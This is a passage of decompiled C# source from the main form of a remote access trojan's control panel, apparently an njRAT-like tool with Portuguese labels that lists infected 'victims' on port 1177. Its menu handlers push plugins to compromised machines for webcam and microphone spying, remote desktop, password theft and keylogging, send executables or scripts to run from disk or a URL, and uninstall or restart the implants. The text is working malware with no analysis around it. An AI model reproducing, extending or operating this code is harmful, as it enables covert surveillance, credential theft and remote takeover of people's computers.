									if (flag2)
									{
										flag3 = true;
									}
								}
								flag2 = (!client.Isend && flag3);
								if (flag2)
								{
									client.Isend = true;
									client.lastPC = DateAndTime.Now;
									client.Send(string.Concat(new string[]
									{
										"CAP",
										Class7.string_1,
										Conversions.ToString(this.L1.Columns[0].Width),
										Class7.string_1,
										Conversions.ToString(this.L1.method_6())
									}));
								}
							}
						}
					}
				}
				Thread.Sleep((int)Math.Round(Math.Round((double)num / 2.0)));
			}
		}

		// Token: 0x06000141 RID: 321 RVA: 0x001E5470 File Offset: 0x001E3870
		private void Form1_Activated(object sender, EventArgs e)
		{
			this.isActive = true;
			this.Opacity = 1.0;
		}

		// Token: 0x06000142 RID: 322 RVA: 0x001E548C File Offset: 0x001E388C
		private void Form1_Deactivate(object sender, EventArgs e)
		{
			this.isActive = false;
			this.Opacity = 0.95;
		}

		// Token: 0x06000143 RID: 323 RVA: 0x001E54A8 File Offset: 0x001E38A8
		[MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
		private void Form1_FormClosing(object sender, FormClosingEventArgs e)
		{
			ProjectData.EndApp();
		}

		// Token: 0x06000144 RID: 324 RVA: 0x001E54B4 File Offset: 0x001E38B4
		[MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
		private void FORM1_CLOSING(object SEND, EventArgs e)
		{
			ProjectData.EndApp();
		}

		// Token: 0x06000145 RID: 325 RVA: 0x001E54C0 File Offset: 0x001E38C0
		private void Form1_Load(object sender, EventArgs e)
		{
			try
			{
				this.Left = 0 - this.Width + Screen.PrimaryScreen.WorkingArea.Width;
				this.Top = 0 - this.Height + Screen.PrimaryScreen.WorkingArea.Height;
				this.L1.method_11("Tela", L1.GEnum0.StretchImage, DataGridViewAutoSizeColumnMode.None);
				this.L1.method_11("Nome", L1.GEnum0.Text, DataGridViewAutoSizeColumnMode.AllCells);
				this.L1.method_11("IP", L1.GEnum0.Text, DataGridViewAutoSizeColumnMode.AllCells);
				this.L1.method_11("PC", L1.GEnum0.Text, DataGridViewAutoSizeColumnMode.AllCells);
				this.L1.method_11("Usuário", L1.GEnum0.Text, DataGridViewAutoSizeColumnMode.AllCells);
				this.L1.method_11("Data Instalada", L1.GEnum0.Text, DataGridViewAutoSizeColumnMode.AllCells);
				this.L1.method_11("Bandeira", L1.GEnum0.Image, DataGridViewAutoSizeColumnMode.AllCells);
				this.L1.method_11("País", L1.GEnum0.Text, DataGridViewAutoSizeColumnMode.AllCells);
				this.L1.method_11("Sistema Operacional", L1.GEnum0.Text, DataGridViewAutoSizeColumnMode.AllCells);
				this.L1.method_11("WebCam", L1.GEnum0.Text, DataGridViewAutoSizeColumnMode.AllCells);
				this.L1.method_11("Versão", L1.GEnum0.Text, DataGridViewAutoSizeColumnMode.AllCells);
				this.L1.method_11("Ping", L1.GEnum0.Text, DataGridViewAutoSizeColumnMode.AllCells);
				this.L1.method_11("Janela Ativa", L1.GEnum0.Text, DataGridViewAutoSizeColumnMode.AllCells);
				this.L1.Columns[0].Width = 35;
				this.Show();
				Class7.notf_0.Show();
				Control.CheckForIllegalCrossThreadCalls = false;
				Class7.form1_0 = this;
				this.Text = Class7.string_0;
				this.ShowInTaskbar = true;
				this.Pp1.T.Enabled = true;
				foreach (string fileName in Directory.GetFiles(Application.StartupPath + "\\plugin\\", "*.dll"))
				{
					Class7.Class9 item = new Class7.Class9(new FileInfo(fileName).Name.ToLower());
					Class7.list_1.Add(item);
				}
				foreach (string text in Strings.Split("cam.dll,ch.dll,pw.dll,sc2.dll,mic.dll,plg.dll", ",", -1, CompareMethod.Binary))
				{
					bool flag = Class7.smethod_0(text, null) == null;
					if (flag)
					{
						Interaction.MsgBox(" " + text, MsgBoxStyle.OkOnly, null);
						string left = Strings.Split(text, ".", -1, CompareMethod.Binary)[0];
						flag = (Operators.CompareString(left, "cam", false) == 0);
						if (flag)
						{
							this.RemoteCamToolStripMenuItem.Enabled = false;
						}
						else
						{
							flag = (Operators.CompareString(left, "ch", false) == 0);
							if (flag)
							{
								this.OpenChatToolStripMenuItem.Enabled = false;
							}
							else
							{
								flag = (Operators.CompareString(left, "plg", false) == 0);
								if (flag)
								{
									this.ManagerToolStripMenuItem.Enabled = false;
								}
								else
								{
									flag = (Operators.CompareString(left, "pw", false) == 0);
									if (flag)
									{
										this.GetPasswordsToolStripMenuItem.Enabled = false;
									}
									else
									{
										flag = (Operators.CompareString(left, "sc2", false) == 0);
										if (flag)
										{
											this.RemoteDesktopToolStripMenuItem.Enabled = false;
										}
										else
										{
											flag = (Operators.CompareString(left, "mic", false) == 0);
											if (flag)
											{
												this.MicrophoneToolStripMenuItem.Enabled = false;
											}
										}
									}
								}
							}
						}
					}
				}
				try
				{
					Class7.waveOut_0 = new WaveOut(0);
					Class7.waveOut_0.Open(WaveFormat.Pcm8Khz8BitMono);
					Class7.waveOut_1 = new WaveOut(0);
					Class7.waveOut_1.Open(WaveFormat.Pcm44Khz16BitMono);
				}
				catch (Exception ex)
				{
					this.MicrophoneToolStripMenuItem.Enabled = false;
				}
				Class7.class8_0.method_0();
				for (;;)
				{
					try
					{
						port port = new port();
						port.NumericUpDown1.Value = Conversions.ToDecimal(Class6.smethod_2("Porta", "1177"));
						port.ShowDialog(this);
						bool flag = port.port < 1;
						if (flag)
						{
							this.Close();
							return;
						}
						this.port = port.port;
						this.S = new SK(this.port);
						Class6.smethod_3("port", Conversions.ToString(this.port));
					}
					catch (Exception ex2)
					{
						Interaction.MsgBox(ex2.Message, MsgBoxStyle.OkOnly, null);
						continue;
					}
					break;
				}
				Class7.sk_0 = this.S;
				Thread thread = new Thread(new ThreadStart(this.dsk), 1);
				thread.Start();
				this.Timer1.Enabled = true;
			}
			catch (Exception ex3)
			{
			}
		}

		// Token: 0x06000146 RID: 326 RVA: 0x001E59E8 File Offset: 0x001E3DE8
		private void ToolStripStatusLabel1_Click(object sender, EventArgs e)
		{
			bool flag = Operators.ConditionalCompareObjectEqual(RuntimeHelpers.GetObjectValue(this.ToolStripStatusLabel1.Tag), "2", false);
			if (flag)
			{
				this.ToolStripStatusLabel1.Text = "[ Logs ]";
				this.ToolStripStatusLabel1.Tag = "1";
				this.L1.BringToFront();
			}
			else
			{
				this.ToolStripStatusLabel1.Text = "[ Usuários ]";
				this.ToolStripStatusLabel1.Tag = "2";
				this.Pp1.BringToFront();
			}
		}

		// Token: 0x06000147 RID: 327 RVA: 0x001E5A78 File Offset: 0x001E3E78
		private void DisconnectToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				foreach (object obj in this.L1.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					try
					{
						NewLateBinding.LateSetComplex(RuntimeHelpers.GetObjectValue(dataGridViewRow.Tag), null, "CN", new object[]
						{
							false
						}, null, null, false, true);
					}
					catch (Exception ex)
					{
					}
				}
			}
			finally
			{
				IEnumerator enumerator;
				bool flag = enumerator is IDisposable;
				if (flag)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		// Token: 0x06000148 RID: 328 RVA: 0x001E5B50 File Offset: 0x001E3F50
		private void RemoteCamToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.L1.SelectedRows.Count != 0;
			if (flag)
			{
				Class7.Class9 class9_ = Class7.smethod_0("cam.dll", null);
				try
				{
					foreach (object obj in this.L1.SelectedRows)
					{
						DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
						Class7.smethod_2((Client)dataGridViewRow.Tag, class9_, false);
					}
				}
				finally
				{
					IEnumerator enumerator;
					flag = (enumerator is IDisposable);
					if (flag)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
		}

		// Token: 0x06000149 RID: 329 RVA: 0x001E5BF4 File Offset: 0x001E3FF4
		private void GetPasswordsToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.L1.SelectedRows.Count != 0;
			if (flag)
			{
				Class7.Class9 class9_ = Class7.smethod_0("pw.dll", null);
				try
				{
					foreach (object obj in this.L1.SelectedRows)
					{
						DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
						Class7.smethod_2((Client)dataGridViewRow.Tag, class9_, true);
					}
				}
				finally
				{
					IEnumerator enumerator;
					flag = (enumerator is IDisposable);
					if (flag)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
		}

		// Token: 0x0600014A RID: 330 RVA: 0x001E5C98 File Offset: 0x001E4098
		private void KeyloggerToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				foreach (object obj in this.L1.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(dataGridViewRow.Tag), null, "Send", new object[]
					{
						"kl"
					}, null, null, null, true);
				}
			}
			finally
			{
				IEnumerator enumerator;
				bool flag = enumerator is IDisposable;
				if (flag)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		// Token: 0x0600014B RID: 331 RVA: 0x001E5D30 File Offset: 0x001E4130
		private void ToolStripStatusLabel4_Click(object sender, EventArgs e)
		{
			MyProject.Forms.About.ShowDialog();
		}

		// Token: 0x0600014C RID: 332 RVA: 0x001E5D44 File Offset: 0x001E4144
		private void OpenChatToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.L1.SelectedRows.Count != 0;
			if (flag)
			{
				Class7.Class9 class9_ = Class7.smethod_0("ch.dll", null);
				try
				{
					foreach (object obj in this.L1.SelectedRows)
					{
						DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
						Class7.smethod_2((Client)dataGridViewRow.Tag, class9_, false);
					}
				}
				finally
				{
					IEnumerator enumerator;
					flag = (enumerator is IDisposable);
					if (flag)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
		}

		// Token: 0x0600014D RID: 333 RVA: 0x001E5DE8 File Offset: 0x001E41E8
		private void OpenFolderToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				bool flag = !Directory.Exists(Conversions.ToString(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(this.L1.SelectedRows[0].Tag), null, "folder", new object[0], null, null, null))));
				if (flag)
				{
					Directory.CreateDirectory(Conversions.ToString(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(this.L1.SelectedRows[0].Tag), null, "folder", new object[0], null, null, null))));
				}
				object[] array = new object[1];
				object objectValue = RuntimeHelpers.GetObjectValue(this.L1.SelectedRows[0].Tag);
				array[0] = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(objectValue), null, "folder", new object[0], null, null, null))));
				object[] array2 = array;
				bool[] array3 = new bool[]
				{
					true
				};
				NewLateBinding.LateCall(null, typeof(Process), "Start", array2, null, null, array3, true);
				flag = array3[0];
				if (flag)
				{
					NewLateBinding.LateSetComplex(RuntimeHelpers.GetObjectValue(objectValue), null, "folder", new object[]
					{
						RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array2[0])))
					}, null, null, true, true);
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x0600014E RID: 334 RVA: 0x001E5F6C File Offset: 0x001E436C
		private void FromLINKToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			bool flag = this.L1.SelectedRows.Count != 0;
			if (flag)
			{
				OpenFileDialog openFileDialog = new OpenFileDialog
				{
					FileName = string.Empty
				};
				flag = (openFileDialog.ShowDialog() == DialogResult.OK);
				if (flag)
				{
					bool flag2 = true;
					byte[] array = Class6.smethod_8(File.ReadAllBytes(openFileDialog.FileName), ref flag2);
					MemoryStream memoryStream = new MemoryStream();
					string text = "rn" + Class7.string_1 + new FileInfo(openFileDialog.FileName).Extension.Remove(0, 1) + Class7.string_1;
					memoryStream.Write(Class6.smethod_11(ref text), 0, text.Length);
					memoryStream.Write(array, 0, array.Length);
					Thread thread = new Thread(new ParameterizedThreadStart(Class7.smethod_4), 1);
					thread.Start(new object[]
					{
						memoryStream.ToArray(),
						this.L1.DefaultCellStyle.ForeColor
					});
				}
			}
		}

		// Token: 0x0600014F RID: 335 RVA: 0x001E607C File Offset: 0x001E447C
		private void FromDISKToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			bool flag = this.L1.SelectedRows.Count != 0;
			if (flag)
			{
				OpenFileDialog openFileDialog = new OpenFileDialog
				{
					Filter = "|*.exe",
					FileName = string.Empty
				};
				flag = (openFileDialog.ShowDialog() == DialogResult.OK);
				if (flag)
				{
					bool flag2 = true;
					byte[] array = Class6.smethod_8(File.ReadAllBytes(openFileDialog.FileName), ref flag2);
					MemoryStream memoryStream = new MemoryStream();
					string text = "up" + Class7.string_1;
					memoryStream.Write(Class6.smethod_11(ref text), 0, text.Length);
					memoryStream.Write(array, 0, array.Length);
					Thread thread = new Thread(new ParameterizedThreadStart(Class7.smethod_4), 1);
					thread.Start(new object[]
					{
						memoryStream.ToArray(),
						this.L1.DefaultCellStyle.ForeColor
					});
				}
			}
		}

		// Token: 0x06000150 RID: 336 RVA: 0x001E6180 File Offset: 0x001E4580
		private void ScriptToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.L1.SelectedRows.Count != 0;
			if (flag)
			{
				script script = new script();
				script.ShowDialog(this);
				flag = (script.Code.Length > 0);
				if (flag)
				{
					bool flag2 = true;
					byte[] array = Class6.smethod_8(Class6.smethod_11(ref script.Code), ref flag2);
					MemoryStream memoryStream = new MemoryStream();
					MemoryStream memoryStream2 = memoryStream;
					string text = "rn" + Class7.string_1 + script.RunAs + Class7.string_1;
					byte[] buffer = Class6.smethod_11(ref text);
					int offset = 0;
					string text2 = "rn" + Class7.string_1 + script.RunAs + Class7.string_1;
					memoryStream2.Write(buffer, offset, Class6.smethod_11(ref text2).Length);
					memoryStream.Write(array, 0, array.Length);
					Thread thread = new Thread(new ParameterizedThreadStart(Class7.smethod_4), 1);
					thread.Start(new object[]
					{
						memoryStream.ToArray(),
						this.L1.DefaultCellStyle.ForeColor
					});
				}
			}
		}

		// Token: 0x06000151 RID: 337 RVA: 0x001E629C File Offset: 0x001E469C
		private void UninstallToolStripMenuItem_Click(object sender, EventArgs e)
		{
			Thread thread = new Thread(new ParameterizedThreadStart(Class7.smethod_4), 1);
			Thread thread2 = thread;
			object[] array = new object[2];
			object[] array2 = array;
			int num = 0;
			string text = "un" + Class7.string_1 + "~";
			array2[num] = Class6.smethod_11(ref text);
			array[1] = this.L1.DefaultCellStyle.ForeColor;
			thread2.Start(array);
		}

		// Token: 0x06000152 RID: 338 RVA: 0x001E6308 File Offset: 0x001E4708
		private void MicrophoneToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.L1.SelectedRows.Count != 0;
			if (flag)
			{
				Class7.Class9 class9_ = Class7.smethod_0("mic.dll", null);
				try
				{
					foreach (object obj in this.L1.SelectedRows)
					{
						DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
						Class7.smethod_2((Client)dataGridViewRow.Tag, class9_, false);
					}
				}
				finally
				{
					IEnumerator enumerator;
					flag = (enumerator is IDisposable);
					if (flag)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
		}

		// Token: 0x06000153 RID: 339 RVA: 0x001E63AC File Offset: 0x001E47AC
		private void ToolStripStatusLabel5_Click(object sender, EventArgs e)
		{
			STNG stng = new STNG
			{
				StartPosition = FormStartPosition.CenterParent
			};
			stng.ShowDialog();
		}

		// Token: 0x06000154 RID: 340 RVA: 0x001E63D4 File Offset: 0x001E47D4
		private void ManagerToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				foreach (object obj in this.L1.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					Client client = (Client)dataGridViewRow.Tag;
					bool flag = client != null;
					if (flag)
					{
						Manager manager = (Manager)Class7.smethod_3("m" + client.ip());
						flag = (manager == null);
						if (flag)
						{
							manager = new Manager
							{
								sk = client,
								Name = "m" + client.ip()
							};
							manager.Show();
						}
						else
						{
							manager.WindowState = FormWindowState.Minimized;
							manager.WindowState = FormWindowState.Normal;
						}
					}
				}
			}
			finally
			{
				IEnumerator enumerator;
				bool flag = enumerator is IDisposable;
				if (flag)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		// Token: 0x06000155 RID: 341 RVA: 0x001E64CC File Offset: 0x001E48CC
		private void L1_ColumnWidthChanged(object sender, DataGridViewColumnEventArgs e)
		{
			bool flag = e.Column.Index == 0;
			if (flag)
			{
				bool flag2 = e.Column.Width > 250;
				if (flag2)
				{
					e.Column.Width = 250;
				}
				flag2 = (e.Column.Width < 35);
				if (flag2)
				{
					e.Column.Width = 35;
				}
				this.L1.method_7((int)Math.Round(Math.Round((double)e.Column.Width * 0.67)));
			}
		}

		// Token: 0x06000156 RID: 342 RVA: 0x001E6568 File Offset: 0x001E4968
		private void NotifyIcon1_MouseDoubleClick(object sender, MouseEventArgs e)
		{
			try
			{
				Interaction.AppActivate(this.Text);
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x06000157 RID: 343 RVA: 0x001E65A8 File Offset: 0x001E49A8
		private void ShowToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				Interaction.AppActivate(this.Text);
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x06000158 RID: 344 RVA: 0x001E65E8 File Offset: 0x001E49E8
		private void RestartToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			Process.Start(Application.ExecutablePath);
			this.Close();
		}

		// Token: 0x06000159 RID: 345 RVA: 0x001E6600 File Offset: 0x001E4A00
		private void ExitToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.Close();
		}

		// Token: 0x0600015A RID: 346 RVA: 0x001E660C File Offset: 0x001E4A0C
		private void RestartToolStripMenuItem_Click(object sender, EventArgs e)
		{
			Thread thread = new Thread(new ParameterizedThreadStart(Class7.smethod_4), 1);
			Thread thread2 = thread;
			object[] array = new object[2];
			object[] array2 = array;
			int num = 0;
			string text = "un" + Class7.string_1 + "@";
			array2[num] = Class6.smethod_11(ref text);
			array[1] = this.L1.DefaultCellStyle.ForeColor;
			thread2.Start(array);
		}

		// Token: 0x0600015B RID: 347 RVA: 0x001E6678 File Offset: 0x001E4A78
		private void CloseToolStripMenuItem_Click(object sender, EventArgs e)
		{
			Thread thread = new Thread(new ParameterizedThreadStart(Class7.smethod_4), 1);
			Thread thread2 = thread;
			object[] array = new object[2];
			object[] array2 = array;
			int num = 0;
			string text = "un" + Class7.string_1 + "!";
			array2[num] = Class6.smethod_11(ref text);
			array[1] = this.L1.DefaultCellStyle.ForeColor;
			thread2.Start(array);
		}

		// Token: 0x0600015C RID: 348 RVA: 0x001E66E4 File Offset: 0x001E4AE4
		private void FromDiskToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.L1.SelectedRows.Count != 0;
			if (flag)
			{
				OpenFileDialog openFileDialog = new OpenFileDialog
				{
					FileName = string.Empty
				};
				flag = (openFileDialog.ShowDialog() == DialogResult.OK);
				if (flag)
				{
					bool flag2 = true;
					byte[] array = Class6.smethod_8(File.ReadAllBytes(openFileDialog.FileName), ref flag2);
					MemoryStream memoryStream = new MemoryStream();
					string text = "rn" + Class7.string_1 + new FileInfo(openFileDialog.FileName).Extension.Remove(0, 1) + Class7.string_1;
					memoryStream.Write(Class6.smethod_11(ref text), 0, text.Length);
					memoryStream.Write(array, 0, array.Length);
					Thread thread = new Thread(new ParameterizedThreadStart(Class7.smethod_4), 1);
					thread.Start(new object[]
					{
						memoryStream.ToArray(),
						this.L1.DefaultCellStyle.ForeColor
					});
				}
			}
		}

		// Token: 0x0600015D RID: 349 RVA: 0x001E67F4 File Offset: 0x001E4BF4
		private void FromLinkToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.L1.SelectedRows.Count != 0;
			if (flag)
			{
				FURL furl = new FURL();
				furl.ShowDialog(this);
				flag = furl.IsOK;
				if (flag)
				{
					string text = string.Concat(new string[]
					{
						"rn",
						Class7.string_1,
						furl.TextBox2.Text,
						Class7.string_1,
						furl.TextBox1.Text
					});
					Thread thread = new Thread(new ParameterizedThreadStart(Class7.smethod_4), 1);
					thread.Start(new object[]
					{
						Class6.smethod_11(ref text),
						Color.Green
					});
				}
			}
		}

		// Token: 0x0600015E RID: 350 RVA: 0x001E68C8 File Offset: 0x001E4CC8
		private void RenameToolStripMenuItem_Click(object sender, EventArgs e)
		{
			string text = Interaction.InputBox("Digite o Novo Nome", "Renomear Vitima", string.Empty, -1, -1);
			bool flag = text.Length > 0;
			if (flag)
			{
				try
				{
					foreach (object obj in this.L1.SelectedRows)
					{
						DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
						try
						{
							NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(dataGridViewRow.Tag), null, "Send", new object[]
							{
								string.Concat(new string[]
								{
									"prof",
									Class7.string_1,
									"~",
									Class7.string_1,
									"vn",
									Class7.string_1,
									Class6.smethod_14(ref text)
								})
							}, null, null, null, true);
							dataGridViewRow.Cells[Class7.int_0].Value = text + "_" + Strings.Split(Conversions.ToString(RuntimeHelpers.GetObjectValue(dataGridViewRow.Cells[Class7.int_0].Value)), "_", -1, CompareMethod.Binary)[Strings.Split(Conversions.ToString(RuntimeHelpers.GetObjectValue(dataGridViewRow.Cells[Class7.int_0].Value)), "_", -1, CompareMethod.Binary).Length - 1];
						}
						catch (Exception ex)
						{
						}
					}
				}
				finally
				{
					IEnumerator enumerator;
					flag = (enumerator is IDisposable);
					if (flag)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
		}

		// Token: 0x0600015F RID: 351 RVA: 0x001E6AB8 File Offset: 0x001E4EB8
		private void ToolStripStatusLabel3_Click(object sender, EventArgs e)
		{
			MyProject.Forms.Builder.ShowDialog();
		}

		// Token: 0x06000160 RID: 352 RVA: 0x001E6ACC File Offset: 0x001E4ECC
		private void RemoteDesktopToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.L1.SelectedRows.Count != 0;
			if (flag)
			{
				Class7.Class9 class9_ = Class7.smethod_0("sc2.dll", null);
				try
				{
					foreach (object obj in this.L1.SelectedRows)
					{
						DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
						Class7.smethod_2((Client)dataGridViewRow.Tag, class9_, false);
					}
				}
				finally
				{
					IEnumerator enumerator;
					flag = (enumerator is IDisposable);
					if (flag)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
		}

		// Token: 0x06000161 RID: 353 RVA: 0x001E6B70 File Offset: 0x001E4F70
		private void Timer1_Tick(object sender, EventArgs e)
		{
			try
			{
				this.int_0++;
				bool flag = this.int_0 == 10;
				if (flag)
				{
					this.int_0 = 0;
					this.upl.Text = "Envio [ " + Class6.smethod_17(Class7.long_0) + " ]";
					this.dwn.Text = "Baixado [ " + Class6.smethod_17(Class7.long_1) + " ]";
					Class7.long_0 = 0L;
					Class7.long_1 = 0L;
				}
				this.Text = string.Concat(new string[]
				{
					Class7.string_0,
					"    Porta [ ",
					Conversions.ToString(this.port),
					" ]    Online [ ",
					Conversions.ToString(this.L1.RowCount),
					" ]    Selecionado [ ",
					Conversions.ToString(this.L1.SelectedRows.Count),
					" ]"
				});
				this.conz.Text = "Conexões [ " + Conversions.ToString(this.S.Online.Count) + " ]";
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x06000162 RID: 354 RVA: 0x001E6CD8 File Offset: 0x001E50D8
		private void SacanearToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.L1.SelectedRows.Count != 0;
			if (flag)
			{
				script script = new script();
				script.Show();
			}
		}

		// Token: 0x0400007C RID: 124
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		// Token: 0x0400007E RID: 126
		[AccessedThroughProperty("StatusStrip1")]
		private StatusStrip _StatusStrip1;

		// Token: 0x0400007F RID: 127
		[AccessedThroughProperty("ToolStripStatusLabel1")]
		private ToolStripStatusLabel _ToolStripStatusLabel1;

		// Token: 0x04000080 RID: 128
		[AccessedThroughProperty("ToolStripStatusLabel3")]
		private ToolStripStatusLabel _ToolStripStatusLabel3;

		// Token: 0x04000081 RID: 129
		[AccessedThroughProperty("ToolStripStatusLabel5")]
		private ToolStripStatusLabel _ToolStripStatusLabel5;

		// Token: 0x04000082 RID: 130
		[AccessedThroughProperty("ToolStripStatusLabel4")]
		private ToolStripStatusLabel _ToolStripStatusLabel4;

		// Token: 0x04000083 RID: 131
		[AccessedThroughProperty("conz")]
		private ToolStripStatusLabel _conz;

		// Token: 0x04000084 RID: 132
		[AccessedThroughProperty("upl")]
		private ToolStripStatusLabel _upl;

		// Token: 0x04000085 RID: 133
		[AccessedThroughProperty("dwn")]
		private ToolStripStatusLabel _dwn;

		// Token: 0x04000086 RID: 134
		[AccessedThroughProperty("ContextMenuStrip1")]
		private ContextMenuStrip _ContextMenuStrip1;

		// Token: 0x04000087 RID: 135
		[AccessedThroughProperty("ManagerToolStripMenuItem")]
		private ToolStripMenuItem _ManagerToolStripMenuItem;

		// Token: 0x04000088 RID: 136
		[AccessedThroughProperty("RunFileToolStripMenuItem")]
		private ToolStripMenuItem _RunFileToolStripMenuItem;

		// Token: 0x04000089 RID: 137
		[AccessedThroughProperty("FromLinkToolStripMenuItem")]
		private ToolStripMenuItem _FromLinkToolStripMenuItem;

		// Token: 0x0400008A RID: 138
		[AccessedThroughProperty("FromDiskToolStripMenuItem")]
		private ToolStripMenuItem _FromDiskToolStripMenuItem;

		// Token: 0x0400008B RID: 139
		[AccessedThroughProperty("ScriptToolStripMenuItem")]
		private ToolStripMenuItem _ScriptToolStripMenuItem;

		// Token: 0x0400008C RID: 140
		[AccessedThroughProperty("RemoteDesktopToolStripMenuItem")]
		private ToolStripMenuItem _RemoteDesktopToolStripMenuItem;

		// Token: 0x0400008D RID: 141
		[AccessedThroughProperty("RemoteCamToolStripMenuItem")]
		private ToolStripMenuItem _RemoteCamToolStripMenuItem;

		// Token: 0x0400008E RID: 142
		[AccessedThroughProperty("MicrophoneToolStripMenuItem")]
		private ToolStripMenuItem _MicrophoneToolStripMenuItem;

		// Token: 0x0400008F RID: 143
		[AccessedThroughProperty("GetPasswordsToolStripMenuItem")]
		private ToolStripMenuItem _GetPasswordsToolStripMenuItem;

		// Token: 0x04000090 RID: 144
		[AccessedThroughProperty("KeyloggerToolStripMenuItem")]
		private ToolStripMenuItem _KeyloggerToolStripMenuItem;

		// Token: 0x04000091 RID: 145
		[AccessedThroughProperty("OpenChatToolStripMenuItem")]
		private ToolStripMenuItem _OpenChatToolStripMenuItem;

		// Token: 0x04000092 RID: 146
		[AccessedThroughProperty("ServerToolStripMenuItem")]
		private ToolStripMenuItem _ServerToolStripMenuItem;

		// Token: 0x04000093 RID: 147
		[AccessedThroughProperty("UpdateToolStripMenuItem")]
		private ToolStripMenuItem _UpdateToolStripMenuItem;

		// Token: 0x04000094 RID: 148
		[AccessedThroughProperty("FromDISKToolStripMenuItem1")]
		private ToolStripMenuItem _FromDISKToolStripMenuItem1;

		// Token: 0x04000095 RID: 149
		[AccessedThroughProperty("FromLINKToolStripMenuItem1")]
		private ToolStripMenuItem _FromLINKToolStripMenuItem1;

		// Token: 0x04000096 RID: 150
		[AccessedThroughProperty("UninstallToolStripMenuItem")]
		private ToolStripMenuItem _UninstallToolStripMenuItem;

		// Token: 0x04000097 RID: 151
		[AccessedThroughProperty("RestartToolStripMenuItem")]
		private ToolStripMenuItem _RestartToolStripMenuItem;

		// Token: 0x04000098 RID: 152
		[AccessedThroughProperty("CloseToolStripMenuItem")]
		private ToolStripMenuItem _CloseToolStripMenuItem;

		// Token: 0x04000099 RID: 153
		[AccessedThroughProperty("DisconnectToolStripMenuItem")]
		private ToolStripMenuItem _DisconnectToolStripMenuItem;

		// Token: 0x0400009A RID: 154
		[AccessedThroughProperty("RenameToolStripMenuItem")]
		private ToolStripMenuItem _RenameToolStripMenuItem;

		// Token: 0x0400009B RID: 155
		[AccessedThroughProperty("OpenFolderToolStripMenuItem")]
		private ToolStripMenuItem _OpenFolderToolStripMenuItem;

		// Token: 0x0400009C RID: 156
		[AccessedThroughProperty("IMG2")]
		private ImageList _IMG2;

		// Token: 0x0400009D RID: 157
		[AccessedThroughProperty("L1")]
		private L1 _L1;

		// Token: 0x0400009E RID: 158
		[AccessedThroughProperty("Pp1")]
		private Pp1 _Pp1;

		// Token: 0x0400009F RID: 159
		[AccessedThroughProperty("Timer1")]
		private System.Windows.Forms.Timer _Timer1;

		// Token: 0x040000A0 RID: 160
		[AccessedThroughProperty("SacanearToolStripMenuItem")]
		private ToolStripMenuItem _SacanearToolStripMenuItem;

		// Token: 0x040000A1 RID: 161
		[AccessedThroughProperty("ColorDialog1")]
		private ColorDialog _ColorDialog1;

		// Token: 0x040000A2 RID: 162
		[AccessedThroughProperty("ColorDialog2")]
		private ColorDialog _ColorDialog2;

		// Token: 0x040000A3 RID: 163
		private int int_0;

		// Token: 0x040000A4 RID: 164
		public bool isActive;

		// Token: 0x040000A5 RID: 165
		public int port;

		// Token: 0x040000A6 RID: 166
		public SK S;
	}
}
